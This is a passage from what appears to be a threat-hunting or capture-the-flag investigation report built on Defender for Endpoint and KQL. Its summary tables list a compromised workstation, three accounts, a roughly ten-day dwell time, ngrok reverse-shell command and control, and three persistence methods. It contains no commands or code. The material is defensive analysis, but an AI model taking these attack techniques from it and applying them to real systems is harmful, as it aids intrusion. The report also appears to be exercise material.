|--------|-------|
| Total Flags Investigated | 31 |
| Affected Device | CH-OPS-WKS02 |
| Attacker Dwell Time | ~10 days (Nov 23 – Dec 2, 2025) |
| Accounts Compromised | 3 (`chadmin`, `ops.maintenance`, `analyst.user`) |
| Attacker Origin | Vietnam |
| Pivot Host | `10.168.0.6` (`対手`) |
| C2 Method | Local listener (8080) + ngrok reverse shell |
| Persistence Mechanisms | 3 (Run key, Scheduled Task, Startup folder) |
| MITRE Techniques Identified | 14 |

---

## Document Information

| Field | Value |
|-------|-------|
| Classification | CONFIDENTIAL |
| Investigation | CorpHealth Operations Activity Review |
| Platform | Microsoft Defender for Endpoint / Azure LAW |
| Tool | KQL (Kusto Query Language) |
| Status | In Progress |
